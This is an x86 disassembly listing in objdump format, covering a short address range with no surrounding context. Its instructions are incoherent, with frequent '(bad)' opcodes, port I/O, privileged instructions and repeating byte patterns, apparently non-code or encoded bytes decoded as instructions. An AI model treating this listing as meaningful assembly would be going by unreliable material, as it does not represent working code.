  42363b:	or     al,0xb2
  42363d:	mov    edx,0x80b2ff29
  423642:	lock std 
  423644:	or     DWORD PTR [edx],esp
  423646:	mov    dl,0x80
  423648:	lock push 0xffffff8f
  42364b:	out    dx,al
  42364c:	out    dx,eax
  42364d:	adc    BYTE PTR [edi+0x4],dh
  423650:	sub    BYTE PTR [edx-0x80],0x77
  423654:	test   DWORD PTR [eax+0x5153f7f0],0xbab27453
  42365e:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423664:	xor    al,0xfd
  423667:	or     DWORD PTR [edx],esp
  423669:	mov    dl,0x80
  42366b:	lock push ss
  42366d:	adc    BYTE PTR [edi+0x53115316],0x7e
  423674:	mov    dl,0xbe
  423676:	or     al,0xb2
  423678:	clc    
  423679:	sub    edi,edi
  42367b:	(bad)  
  42367c:	in     al,dx
  42367d:	mov    dl,0x80
  42367f:	lock push 0x9
  423682:	loopne 0x4236a5
  423684:	out    dx,eax
  423685:	or     BYTE PTR [edi+0xa],0x4d
  423689:	dec    ebp
  42368a:	dec    ebp
  42368b:	sbb    BYTE PTR [eax],0xa
  42368e:	dec    ebp
  42368f:	dec    ebp
  423690:	dec    ebp
  423691:	push   ebx
  423692:	je     0x4236e7
  423694:	jle    0x423648
  423696:	xchg   BYTE PTR [edx+esi*4],cl
  423699:	clc    
  42369a:	sub    edi,edi
  42369c:	sti    
  42369d:	in     al,dx
  42369e:	mov    dl,0x9
  4236a0:	loopne 0x423692
  4236a2:	add    al,0x53
  4236a4:	std    
  4236a5:	adc    al,dh
  4236a7:	add    al,0x80
  4236a9:	push   0xffffff8f
  4236ab:	ja     0x4236b1
  4236ad:	xor    al,0xf7
  4236b0:	adc    BYTE PTR [edi+0x531153f7],0x7e
  4236b7:	mov    dl,0xf8
  4236b9:	sub    DWORD PTR [edx-0x100f342],esi
  4236bf:	adc    BYTE PTR [edi-0x1ddf603],0x80
  4236c6:	xchg   edi,eax
  4236c7:	push   0x10
  4236c9:	out    dx,al
  4236ca:	push   cs
  4236cb:	sub    BYTE PTR [edx-0x80],0x77
  4236cf:	test   DWORD PTR [eax+0x7453f7f0],0x86b25153
  4236d9:	or     al,0xb2
  4236db:	mov    edx,0x80b2ff29
  4236e0:	lock std 
  4236e2:	or     DWORD PTR [edx],esp
  4236e4:	mov    dl,0x80
  4236e6:	lock push 0xffffff8f
  4236e9:	out    dx,al
  4236ea:	out    dx,eax
  4236eb:	adc    BYTE PTR [edi+0x4],dh
  4236ee:	sub    BYTE PTR [edx-0x80],0x77
  4236f2:	test   DWORD PTR [eax+0x7453f7f0],0x530c86b2
  4236fc:	push   ecx
  4236fd:	mov    dl,0xba
  4236ff:	sub    edi,edi
  423701:	mov    dl,0x80
  423703:	lock std 
  423705:	or     DWORD PTR [edx],esp
  423707:	mov    dl,0x80
  423709:	lock pop esi
  42370b:	adc    BYTE PTR [edi+0x5311535e],0x7e
  423712:	mov    dl,0xbe
  423714:	or     al,0xb2
  423716:	clc    
  423717:	sub    edi,edi
  423719:	(bad)  
  42371a:	in     al,dx
  42371b:	mov    dl,0x80
  42371d:	lock push 0x9
  423720:	loopne 0x423743
  423722:	out    dx,eax
  423723:	or     BYTE PTR [edi-0x6b],0x4d
  423727:	dec    ebp
  423728:	dec    ebp
  423729:	sbb    BYTE PTR [eax],0x95
  42372c:	dec    ebp
  42372d:	dec    ebp
  42372e:	dec    ebp
  42372f:	push   ebx
  423730:	je     0x423785
  423732:	jle    0x4236e6
  423734:	xchg   BYTE PTR [edx+esi*4],cl
  423737:	clc    
  423738:	sub    edi,edi
  42373a:	sti    
  42373b:	in     al,dx
  42373c:	mov    dl,0x9
  42373e:	loopne 0x423730
  423740:	add    al,0x53
  423742:	std    
  423743:	adc    al,dh
  423745:	add    al,0x80
  423747:	push   0xffffff8f
  423749:	ja     0x42374f
  42374b:	xor    al,0xf7
  42374e:	adc    BYTE PTR [edi+0x531153f7],0x7e
  423755:	mov    dl,0xf8
  423757:	sub    DWORD PTR [edx-0x100f342],esi
  42375d:	adc    BYTE PTR [edi-0x1ddf603],0x80
  423764:	xchg   edi,eax
  423765:	push   0x10
  423767:	out    dx,al
  423768:	push   cs
  423769:	sub    BYTE PTR [edx-0x80],0x77
  42376d:	ss xor al,0x36
  423771:	push   ebx
  423772:	push   ecx
  423773:	push   ebx
  423774:	je     0x423728
  423776:	mov    edx,0xc86b229
  42377b:	push   DWORD PTR [edx-0x7fa10f80]
  423781:	xchg   edi,eax
  423782:	pop    esi
  423783:	push   ebx
  423784:	adc    DWORD PTR [ebx+0x7e],edx
  423787:	mov    dl,0xbe
  423789:	or     al,0xb2
  42378b:	clc    
  42378c:	sub    edi,edi
  42378e:	dec    BYTE PTR [ecx]
  423790:	and    dh,BYTE PTR [edx+0x50fd77ec]
  423796:	ja     0x423795
  423798:	xor    BYTE PTR [edi-0x3],0x80
  42379c:	lock scas eax,DWORD PTR es:[edi]
  42379e:	arpl   bp,di
  4237a0:	or     edx,ebp
  4237a2:	(bad)  
  4237a3:	or     eax,0x77804d4d
  4237a8:	pop    esi
  4237a9:	xor    al,0x5e
  4237ac:	push   ebx
  4237ad:	push   ecx
  4237ae:	mov    dl,0xba
  4237b0:	sub    DWORD PTR [ebx+0x74],edx
  4237b3:	mov    dl,0x86
  4237b5:	or     al,0xff
  4237b7:	mov    dl,0x80
  4237b9:	lock scas eax,DWORD PTR es:[edi]
  4237bb:	or     DWORD PTR [edx],esp
  4237bd:	mov    dl,0x80
  4237bf:	lock jp 0x423815
  4237c2:	adc    DWORD PTR [edx-0x4d00f342],esi
  4237c8:	xor    al,0x7a
  4237cb:	push   ebx
  4237cc:	push   ecx
  4237cd:	mov    dl,0xba
  4237cf:	sub    edi,edi
  4237d1:	mov    dl,0x50
  4237d3:	ja     0x42380b
  4237d5:	xor    BYTE PTR [edi-0x7e],0x80
  4237d9:	lock adc BYTE PTR [ebx+0x51],0xb2
  4237de:	mov    edx,0xb2745329
  4237e3:	xchg   BYTE PTR [edi+edi*8],cl
  4237e6:	mov    dl,0x80
  4237e8:	lock add BYTE PTR [eax+0x11538297],0xb2
  4237f0:	mov    esi,0xb27e530c
  4237f5:	clc    
  4237f6:	sub    edi,edi
  4237f8:	(bad)  
  4237f9:	in     al,dx
  4237fa:	lock ss in al,dx
  4237fd:	std    
  4237fe:	in     al,dx
  4237ff:	lock push esi
  423801:	push   eax
  423802:	lock push esi
  423804:	les    ebx,FWORD PTR ds:0x80827780
  42380a:	lock adc BYTE PTR [ebx+0x74],0x53
  42380f:	push   ecx
  423810:	mov    dl,0x86
  423812:	or     al,0xb2
  423814:	mov    edx,0xecb2ff29
  423819:	ja     0x423871
  42381b:	push   eax
  42381c:	ja     0x423874
  42381e:	xor    BYTE PTR [edi-0x7e],0x80
  423822:	lock adc BYTE PTR [ebx+0x74],0xb2
  423827:	xchg   BYTE PTR [ebx+edx*2],cl
  42382a:	push   ecx
  42382b:	mov    dl,0xba
  42382d:	sub    edi,edi
  42382f:	mov    dl,0x80
  423831:	lock test BYTE PTR [ebx-0x3],al
  423835:	xor    BYTE PTR [edi-0x7e],0x80
  423839:	xchg   edi,eax
  42383a:	adc    BYTE PTR [ebx+0x74],0x53
  42383e:	jle    0x4237f2
  423840:	clc    
  423841:	sub    DWORD PTR [edx-0x400f37a],esi
  423847:	adc    BYTE PTR [edi-0x4ddf6aa],0x63
  42384e:	mov    dl,0x9
  423850:	dec    esp
  423851:	xor    cl,BYTE PTR [edx+0x77804d4d]
  423857:	mov    eax,DWORD PTR [eax+0x77808b77]
  42385d:	mov    dl,BYTE PTR [eax+0x77]
  423860:	xor    BYTE PTR ss:[edi-0x11],0x80
  423865:	lock adc BYTE PTR es:[edi-0x4deeacda],0xbe
  42386e:	or     al,0x53
  423870:	jle    0x4237f2
  423872:	int    0x32
  423874:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  42387a:	(bad)  
  42387b:	(bad)  
  42387c:	xchg   esi,eax
  42387d:	xor    al,0x66
  423880:	adc    BYTE PTR [edi+0x53115366],0x7e
  423887:	mov    dl,0xbe
  423889:	or     al,0xb2
  42388b:	clc    
  42388c:	sub    edi,edi
  42388e:	(bad)  
  42388f:	xchg   esi,eax
  423890:	xor    al,0x8b
  423893:	adc    BYTE PTR [edi+0x36d74d8b],0x53
  42389a:	adc    DWORD PTR [ebx+0x7e],edx
  42389d:	mov    dl,0xbe
  42389f:	or     al,0xb2
  4238a1:	clc    
  4238a2:	sub    edi,edi
  4238a4:	(bad)  
  4238a5:	xchg   esi,eax
  4238a6:	dec    ebp
  4238a7:	or     dl,BYTE PTR ds:0x808bf080
  4238ad:	xchg   edi,eax
  4238ae:	mov    edx,DWORD PTR [ebx+0x11]
  4238b1:	push   ebx
  4238b2:	jle    0x423866
  4238b4:	mov    esi,0x29f8b20c
  4238b9:	(bad)  
  4238ba:	(bad)  
  4238bb:	push   eax
  4238bc:	ja     0x423924
  4238be:	arpl   bp,di
  4238c0:	or     DWORD PTR [edi],ecx
  4238c2:	cmp    al,0x8d
  4238c4:	lea    ecx,[ebp-0x3b748880]
  4238ca:	lock adc BYTE PTR [edi-0x7b88af9a],0x6e
  4238d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238d3:	test   BYTE PTR [eax-0x414d7b10],al
  4238d9:	or     al,0x53
  4238db:	cld    
  4238dc:	mov    dl,0x84
  4238de:	sub    edi,edi
  4238e0:	mov    dl,0x80
  4238e2:	lock jbe 0x423874
  4238e5:	and    DWORD PTR [edx],edi
  4238e7:	adc    BYTE PTR [ecx],ah
  4238e9:	jno    0x42386b
  4238eb:	lock stc 
  4238ed:	xor    al,0xf9
  4238f0:	adc    BYTE PTR [edi+0x531153f9],0x7e
  4238f7:	mov    dl,0xf8
  4238f9:	sub    DWORD PTR [edx-0x100f342],esi
  4238ff:	adc    BYTE PTR [edi-0x7f021307],0x77
  423906:	test   BYTE PTR [ebx-0x6c],dl
  423909:	in     eax,dx
  42390a:	test   BYTE PTR [edx-0x4d750713],cl
  423910:	mov    esi,0xfffbec29
  423915:	mov    dl,0x53
  423917:	jl     0x423899
  423919:	lock mov al,BYTE PTR [eax-0x74d7569]
  423920:	or     al,0xb2
  423922:	mov    esi,0x53b6ff29
  423927:	pushf  
  423928:	arpl   bx,di
  42392a:	xlat   BYTE PTR ds:[ebx]
  42392b:	sub    al,0x80
  42392d:	ja     0x42391e
  42392f:	xor    al,0x2e
  423932:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  423939:	lea    ecx,[ebp+0x7e531153]
  42393f:	mov    dl,0xbe
  423941:	or     al,0xb2
  423943:	clc    
  423944:	sub    edi,edi
  423946:	(bad)  
  423947:	xchg   esi,eax
  423948:	xor    al,0x8b
  42394b:	adc    BYTE PTR [edi+0x5311538b],0x7e
  423952:	mov    dl,0xbe
  423954:	or     al,0xb2
  423956:	clc    
  423957:	sub    edi,edi
  423959:	(bad)  
  42395a:	xchg   esi,eax
  42395b:	dec    ebp
  42395c:	xlat   BYTE PTR ds:[ebx]
  42395d:	jbe    0x4239ac
  42395f:	or     bl,BYTE PTR ds:0x50667780
  423965:	ja     0x4239dd
  423967:	xor    BYTE PTR [edi+0x36],0x50
  42396b:	ja     0x4238f7
  42396d:	xor    BYTE PTR [edi-0x76],0x53
  423971:	jo     0x423960
  423973:	xchg   dh,ch
  423975:	aad    0x43
  423977:	xor    BYTE PTR [edi+0x76],0x80
  42397b:	adc    eax,0x767780ef
  423980:	sub    dh,0xef
  423983:	push   ebx
  423984:	cld    
  423985:	push   ebx
  423986:	xchg   esp,eax
  423987:	mov    dl,0x84
  423989:	sub    DWORD PTR [edx-0x400f3f9],esi
  42398f:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423996:	ja     0x423922
  423998:	in     eax,dx
  423999:	mov    dl,0xee
  42399b:	in     eax,dx
  42399c:	xchg   dh,ch
  42399e:	arpl   bp,di
  4239a0:	in     al,0x98
  4239a2:	xor    BYTE PTR [edi-0x76],0x53
  4239a6:	jo     0x423995
  4239a8:	xchg   dh,ch
  4239aa:	aad    0x43
  4239ac:	xor    BYTE PTR [edi+0x76],0x80
  4239b0:	adc    eax,0x767780ef
  4239b5:	sub    dh,0xef
  4239b8:	push   ebx
  4239b9:	cld    
  4239ba:	push   ebx
  4239bb:	xchg   esp,eax
  4239bc:	mov    dl,0x84
  4239be:	sub    DWORD PTR [edx-0x400f3f9],esi
  4239c4:	adc    BYTE PTR [edi-0x5911af8a],0x80
  4239cb:	ja     0x423957
  4239cd:	in     eax,dx
  4239ce:	mov    dl,0xee
  4239d0:	in     eax,dx
  4239d1:	xchg   dh,ch
  4239d3:	arpl   bp,di
  4239d5:	in     al,0x98
  4239d7:	xor    BYTE PTR [edi+0x76],0x80
  4239db:	lock stc 
  4239dd:	push   eax
  4239de:	ja     0x42398f
  4239e0:	xor    BYTE PTR [edi-0x7],0x53
  4239e4:	adc    DWORD PTR [ebx-0x4],edx
  4239e7:	mov    dl,0x84
  4239e9:	sub    DWORD PTR [edx-0x200f342],esi
  4239ef:	xor    BYTE PTR [edi-0x75],0x50
  4239f3:	lock es jl 0x423a6e
  4239f7:	inc    ecx
  4239f8:	ins    DWORD PTR es:[edi],dx
  4239f9:	pop    ebp
  4239fa:	ins    DWORD PTR es:[edi],dx
  4239fb:	aas    
  4239fc:	jl     0x423a75
  4239fe:	pop    edx
  4239ff:	ins    DWORD PTR es:[edi],dx
  423a00:	inc    ebx
  423a01:	ins    DWORD PTR es:[edi],dx
  423a02:	push   ebx
  423a03:	push   eax
  423a04:	ja     0x423a6c
  423a06:	fsub   QWORD PTR [si]
  423a09:	outs   dx,DWORD PTR ds:[esi]
  423a0a:	cmp    BYTE PTR [ecx],cl
  423a0c:	jg     0x80cfc79f
  423a12:	xchg   edi,eax
  423a13:	scas   eax,DWORD PTR es:[edi]
  423a14:	cmp    ch,0x53
  423a17:	adc    DWORD PTR [eax-0x10],edx
  423a1a:	test   BYTE PTR [edx+0x530c84c7],dh
  423a20:	cld    
  423a21:	mov    dl,0x84
  423a23:	sub    edi,edi
  423a25:	ja     0x4239ab
  423a27:	push   eax
  423a28:	lock bound ecx,QWORD PTR [edi+0x9412f31]
  423a2f:	cli    
  423a30:	out    dx,al
  423a31:	jno    0x423a00
  423a33:	add    eax,0xbdbecdcd
  423a38:	or     eax,esp
  423a3a:	jo     0x423a9f
  423a3c:	mov    dl,0xd7
  423a3e:	fiadd  DWORD PTR [eax-0xf7f0689]
  423a44:	stc    
  423a45:	xor    BYTE PTR [edi-0x7],0x80
  423a49:	xchg   edi,eax
  423a4a:	stc    
  423a4b:	push   ebx
  423a4c:	cld    
  423a4d:	push   ebx
  423a4e:	adc    DWORD PTR [edx-0x414dd67c],esi
  423a54:	or     al,0xff
  423a56:	std    
  423a57:	xor    BYTE PTR [edi+0x66],0x53
  423a5b:	cld    
  423a5c:	mov    dl,0x84
  423a5e:	sub    edi,edi
  423a60:	ja     0x4239e6
  423a62:	push   ebx
  423a63:	xchg   esp,eax
  423a64:	in     al,dx
  423a65:	std    
  423a66:	xor    BYTE PTR [edi+0x62],0xed
  423a6a:	test   BYTE PTR [edx-0x4d750713],cl
  423a70:	mov    esi,0xfff7ec29
  423a75:	(bad)  
  423a76:	push   ebx
  423a77:	sub    al,BYTE PTR [eax+0x66f050b2]
  423a7d:	fsub   QWORD PTR [si]
  423a80:	outs   dx,DWORD PTR ds:[esi]
  423a81:	cmp    bh,dl
  423a83:	add    DWORD PTR [eax-0x6f3bd910],eax
  423a89:	xor    al,0x8b
  423a8c:	xor    BYTE PTR [edi-0x75],0x53
  423a90:	adc    DWORD PTR [ebx-0x4],edx
  423a93:	mov    dl,0xbe
  423a95:	or     al,0xb2
  423a97:	test   BYTE PTR [ecx],ch
  423a99:	(bad)  
  423a9a:	std    
  423a9b:	xor    BYTE PTR [edi-0x75],0x80
  423a9f:	xchg   edi,eax
  423aa0:	mov    edx,DWORD PTR [ebx+0x74]
  423aa3:	push   ebx
  423aa4:	jle    0x423a58
  423aa6:	xchg   BYTE PTR [edx+esi*4],cl
  423aa9:	clc    
  423aaa:	sub    edi,edi
  423aac:	sti    
  423aad:	arpl   WORD PTR [edx+0xc230f09],si
  423ab3:	lea    ecx,[ebp-0x7f508880]
  423ab9:	ins    DWORD PTR es:[edi],dx
  423aba:	out    dx,eax
  423abb:	push   eax
  423abc:	out    0xf9,eax
  423abe:	jl     0x423b37
  423ac0:	es repz and al,0x6f
  423ac4:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423ac8:	hlt    
  423ac9:	and    al,0x6f
  423acb:	cmp    BYTE PTR [edi+esi*2+0x7a],bh
  423acf:	mul    BYTE PTR [ebx+0x777c386f]
  423ad5:	test   dl,bh
  423ad7:	and    al,0x6f
  423ad9:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423add:	nop
  423ade:	shr    BYTE PTR [edi+0x38],1
  423ae1:	push   eax
  423ae2:	ja     0x423b22
  423ae4:	xor    BYTE PTR [edi-0x11],0x80
  423ae8:	lock test BYTE PTR [eax+0x11538497],al
  423aef:	mov    dl,0xbe
  423af1:	or     al,0x53
  423af3:	jle    0x423aa7
  423af5:	clc    
  423af6:	sub    edi,edi
  423af8:	(bad)  
  423af9:	xchg   esi,eax
  423afa:	xor    al,0x7a
  423afd:	adc    BYTE PTR [edi-0x4deeac86],0xbe
  423b04:	or     al,0x53
  423b06:	jle    0x423a88
  423b08:	int    0x32
  423b0a:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b10:	(bad)  
  423b11:	(bad)  
  423b12:	xchg   esi,eax
  423b13:	xor    al,0x66
  423b16:	adc    BYTE PTR [edi+0x53115366],0x7e
  423b1d:	mov    dl,0xbe
  423b1f:	or     al,0xb2
  423b21:	clc    
  423b22:	sub    edi,edi
  423b24:	(bad)  
  423b25:	xchg   esi,eax
  423b26:	xor    al,0xf9
  423b29:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423b30:	mov    dl,0xbe
  423b32:	or     al,0xb2
  423b34:	clc    
  423b35:	sub    edi,edi
  423b37:	(bad)  
  423b38:	xchg   esi,eax
  423b39:	dec    ebp
  423b3a:	or     dl,BYTE PTR ds:0x80667750
  423b40:	ja     0x423b31
  423b42:	xor    al,0x84
  423b45:	adc    BYTE PTR [edi-0x4deeac7c],0xbe
  423b4c:	or     al,0x53
  423b4e:	jle    0x423ad0
  423b50:	int    0x32
  423b52:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b58:	(bad)  
  423b59:	(bad)  
  423b5a:	xchg   esi,eax
  423b5b:	xor    al,0x7a
  423b5e:	adc    BYTE PTR [edi+0x5311537a],0x7e
  423b65:	mov    dl,0xbe
  423b67:	or     al,0xb2
  423b69:	clc    
  423b6a:	sub    edi,edi
  423b6c:	(bad)  
  423b6d:	xchg   esi,eax
  423b6e:	xor    al,0xf9
  423b71:	adc    BYTE PTR [edi+0x3ed74df9],0x53
  423b78:	adc    DWORD PTR [ebx+0x7e],edx
  423b7b:	mov    dl,0xbe
  423b7d:	or     al,0xb2
  423b7f:	clc    
  423b80:	sub    edi,edi
  423b82:	(bad)  
  423b83:	xchg   esi,eax
  423b84:	dec    ebp
  423b85:	or     dl,BYTE PTR ds:0x50f9f080
  423b8b:	ja     0x423b11
  423b8d:	xor    BYTE PTR [edi-0x7],0x53
  423b91:	adc    DWORD PTR [ebx-0x4],edx
  423b94:	mov    dl,0xbe
  423b96:	or     al,0xb2
  423b98:	test   BYTE PTR [ecx],ch
  423b9a:	(bad)  
  423b9b:	std    
  423b9c:	xor    BYTE PTR [edi+0x66],0x63
  423ba0:	std    
  423ba1:	or     DWORD PTR [edi],ecx
  423ba3:	cmp    eax,0x808d8d2f
  423ba8:	lock stc 
  423baa:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423bb1:	mov    dl,0xbe
  423bb3:	or     al,0xb2
  423bb5:	clc    
  423bb6:	sub    edi,edi
  423bb8:	(bad)  
  423bb9:	arpl   ax,si
  423bbb:	test   BYTE PTR [ecx],cl
  423bbd:	bswap  edi
  423bbf:	das    
  423bc0:	lea    ecx,[ebp-0x7fd90f80]
  423bc6:	lock es mov dl,0xbe
  423bca:	or     al,0xcd
  423bcc:	add    eax,0x80ef10c4
  423bd1:	lock stc 
  423bd3:	xor    al,0xf9
  423bd6:	mov    dl,0xbe
  423bd8:	or     al,0xcd
  423bda:	add    eax,0x3a7d10c4
  423bdf:	xor    al,0x36
  423be2:	xor    al,0x36
  423be5:	mov    dl,0xbe
  423be7:	or     al,0xcd
  423be9:	add    eax,0xc7d10c4
  423bee:	in     eax,dx
  423bef:	cmp    BYTE PTR ds:0x8d4d4d4d,bl
  423bf5:	in     eax,dx
  423bf6:	cmp    BYTE PTR ds:0x8d4d4d4d,ah
  423bfc:	add    DWORD PTR [ecx],eax
  423bfe:	and    eax,0x964d4d4d
  423c03:	dec    ebp
  423c04:	xlat   BYTE PTR ds:[ebx]
  423c05:	add    DWORD PTR ds:[ecx],eax
  423c08:	sbb    eax,0x4d4d4d4d
  423c0d:	xlat   BYTE PTR ds:[ebx]
  423c0e:	test   BYTE PTR [esi+0x4daff080],dl
  423c14:	sahf   
  423c15:	and    DWORD PTR [eax-0x4d128910],eax
  423c1b:	jno    0x423bb3
  423c1d:	or     al,BYTE PTR [esi+0x4d4d8832]
  423c23:	push   eax
  423c24:	ja     0x423c88
  423c26:	xor    BYTE PTR [edi-0x11],0x80
  423c2a:	lock adc BYTE PTR cs:[edi+0x32cd802e],0x3a
  423c33:	lea    ecx,[ebp+0x7e531153]
  423c39:	mov    dl,0xbe
  423c3b:	or     al,0xb2
  423c3d:	clc    
  423c3e:	sub    edi,edi
  423c40:	(bad)  
  423c41:	xchg   esi,eax
  423c42:	xor    al,0xf9
  423c45:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c4c:	mov    dl,0xbe
  423c4e:	or     al,0xb2
  423c50:	clc    
  423c51:	sub    edi,edi
  423c53:	(bad)  
  423c54:	xchg   esi,eax
  423c55:	dec    ebp
  423c56:	xlat   BYTE PTR ds:[ebx]
  423c57:	dec    bp
  423c59:	or     bl,BYTE PTR ds:0xb2627780
  423c5f:	push   0xc
  423c61:	push   ebx
  423c62:	jl     0x423cc7
  423c64:	jl     0x423be6
  423c66:	ja     0x423c57
  423c68:	xor    al,0x2e
  423c6b:	or     ch,0x32
  423c6e:	cmp    cl,BYTE PTR [ebp+0x2e97808d]
  423c74:	xlat   BYTE PTR ds:[ebx]
  423c75:	push   ebp
  423c76:	push   ebx
  423c77:	adc    DWORD PTR [ebx+0x7e],edx
  423c7a:	mov    dl,0xbe
  423c7c:	or     al,0xb2
  423c7e:	clc    
  423c7f:	sub    edi,edi
  423c81:	(bad)  
  423c82:	xchg   esi,eax
  423c83:	xor    al,0xf9
  423c86:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c8d:	mov    dl,0xbe
  423c8f:	or     al,0xb2
  423c91:	clc    
  423c92:	sub    edi,edi
  423c94:	(bad)  
  423c95:	xchg   esi,eax
  423c96:	dec    ebp
  423c97:	xlat   BYTE PTR ds:[ebx]
  423c98:	jbe    0x423ce7
  423c9a:	or     bl,BYTE PTR ds:0x50847780
  423ca0:	ja     0x423d18
  423ca2:	xor    BYTE PTR [edi+0x3e],0x50
  423ca6:	ja     0x423c32
  423ca8:	les    edi,FWORD PTR [ecx]
  423caa:	push   ebx
  423cab:	adc    DWORD PTR [ebx+0x7e],edx
  423cae:	mov    dl,0xbe
  423cb0:	or     al,0xb2
  423cb2:	clc    
  423cb3:	sub    edi,edi
  423cb5:	(bad)  
  423cb6:	xchg   esi,eax
  423cb7:	xor    al,0xf9
  423cba:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423cc1:	mov    dl,0xbe
  423cc3:	or     al,0xb2
  423cc5:	clc    
  423cc6:	sub    edi,edi
  423cc8:	(bad)  
  423cc9:	xchg   esi,eax
  423cca:	dec    ebp
  423ccb:	xlat   BYTE PTR ds:[ebx]
  423ccc:	test   BYTE PTR [ebp+0xa],cl
  423ccf:	sbb    eax,0x508a7780
  423cd4:	ja     0x423cf4
  423cd6:	xor    BYTE PTR [edi+0x76],0x50
  423cda:	out    0x56,eax
  423cdc:	push   eax
  423cdd:	ja     0x423d41
  423cdf:	jl     0x423d58
  423ce1:	xor    ch,0x24
  423ce4:	outs   dx,DWORD PTR ds:[esi]
  423ce5:	cmp    BYTE PTR [eax-0xf7fa989],al
  423ceb:	push   esi
  423cec:	push   ebx
  423ced:	cld    
  423cee:	push   ebx
  423cef:	adc    DWORD PTR [edx-0x414dd67c],esi
  423cf5:	or     al,0xff
  423cf7:	mov    dl,0x50
  423cf9:	ja     0x423d41
  423cfb:	xor    BYTE PTR [edi+0x56],0x80
  423cff:	lock push esi
  423d01:	push   ebx
  423d02:	cld    
  423d03:	push   ebx
  423d04:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d0a:	or     al,0xff
  423d0c:	mov    dl,0x50
  423d0e:	ja     0x423cbf
  423d10:	jl     0x423d89
  423d12:	jp     0x423d5d
  423d14:	and    al,0x6f
  423d16:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  423d1a:	fisub  WORD PTR [edi+ebp*2]
  423d1d:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d23:	push   esi
  423d24:	push   ebx
  423d25:	cld    
  423d26:	push   ebx
  423d27:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d2d:	sub    edi,edi
  423d2f:	mov    dl,0x80
  423d31:	lock push ds
  423d33:	arpl   bp,di
  423d35:	or     DWORD PTR [edi],ecx
  423d37:	pop    ss
  423d38:	in     al,dx
  423d39:	lea    ecx,[ebp-0x72f35f42]
  423d3f:	lea    eax,[eax+0x77807af0]
  423d45:	jp     0x423cc7
  423d47:	xchg   edi,eax
  423d48:	inc    esi
  423d49:	push   ebx
  423d4a:	je     0x423d9f
  423d4c:	push   ecx
  423d4d:	mov    dl,0x86
  423d4f:	or     al,0xb2
  423d51:	mov    edx,0x80fdff29
  423d56:	ja     0x423d76
  423d58:	inc    ebx
  423d59:	sti    
  423d5a:	push   ebx
  423d5b:	jb     0x423da8
  423d5d:	add    eax,0x80af7750
  423d62:	ja     0x423ce8
  423d64:	xor    al,0x84
  423d67:	push   ebx
  423d68:	cld    
  423d69:	push   ebx
  423d6a:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d70:	sub    edi,edi
  423d72:	mov    dl,0x80
  423d74:	lock scas eax,DWORD PTR es:[edi]
  423d76:	arpl   bp,di
  423d78:	fst    DWORD PTR [edi]
  423d7a:	xor    BYTE PTR [edi-0x7c],0x80
  423d7e:	lock test BYTE PTR [ebx-0x4],dl
  423d82:	push   ebx
  423d83:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d89:	or     al,0xff
  423d8b:	mov    dl,0x50
  423d8d:	ja     0x423d3e
  423d8f:	xor    BYTE PTR [edi+0x7a],0x80
  423d93:	lock jp 0x423de9
  423d96:	cld    
  423d97:	push   ebx
  423d98:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d9e:	or     al,0xff
  423da0:	mov    dl,0x80
  423da2:	lock scas eax,DWORD PTR es:[edi]
  423da4:	or     DWORD PTR [edx],esp
  423da6:	mov    dl,0x50
  423da8:	ja     0x423d59
  423daa:	xor    BYTE PTR [edi+0x56],0x80
  423dae:	lock push esi
  423db0:	push   ebx
  423db1:	cld    
  423db2:	push   ebx
  423db3:	adc    DWORD PTR [edx-0x7b4df342],esi
  423db9:	sub    edi,edi
  423dbb:	mov    dl,0x80
  423dbd:	lock scas eax,DWORD PTR es:[edi]
  423dbf:	arpl   bp,di
  423dc1:	or     DWORD PTR [edi],ecx
  423dc3:	(bad)  
  423dc4:	or     al,0x8d
  423dc6:	lea    eax,[eax+0x7750af77]
  423dcc:	scas   eax,DWORD PTR es:[edi]
  423dcd:	xor    BYTE PTR [edi+0x46],0xec
  423dd1:	ja     0x423e35
  423dd3:	push   eax
  423dd4:	out    0x3e,eax
  423dd6:	push   eax
  423dd7:	ja     0x423e37
  423dd9:	pop    esi
  423dda:	cmc    
  423ddb:	and    al,0x6f
  423ddd:	cmp    BYTE PTR [eax+0x77],dl
  423de0:	push   0x7c
  423de2:	ja     0x423e4a
  423de4:	hlt    
  423de5:	and    al,0x6f
  423de7:	cmp    BYTE PTR [edi+esi*2+0x26],bh
  423deb:	repz and al,0x6f
  423dee:	cmp    BYTE PTR [eax+0x77],dl
  423df1:	test   DWORD PTR [eax-0xf7fc189],0x53fc533e
  423dfb:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e01:	or     al,0xff
  423e03:	mov    dl,0x50
  423e05:	ja     0x423e04
  423e07:	sub    BYTE PTR [edx-0x42],0x4f
  423e0b:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423e11:	dec    edi
  423e12:	xor    DWORD PTR [ebp+0x4d],ecx
  423e15:	dec    ebp
  423e16:	jmp    0x7c6a:0x80386f24
  423e1d:	dec    edi
  423e1e:	jge    0x423e6d
  423e20:	dec    ebp
  423e21:	dec    ebp
  423e22:	or     esp,DWORD PTR [edi+ebp*2]
  423e25:	cmp    BYTE PTR [eax-0x7f957f96],al
  423e2b:	ja     0x423e24
  423e2d:	xor    al,0xf7
  423e30:	push   ebx
  423e31:	cld    
  423e32:	push   ebx
  423e33:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e39:	or     al,0xff
  423e3b:	mov    dl,0x80
  423e3d:	lock std 
  423e3f:	or     DWORD PTR [edx],esp
  423e41:	mov    dl,0x80
  423e43:	lock pop esi
  423e45:	(bad)  
  423e46:	out    dx,al
  423e47:	out    dx,eax
  423e48:	adc    BYTE PTR [edi-0x54],dh
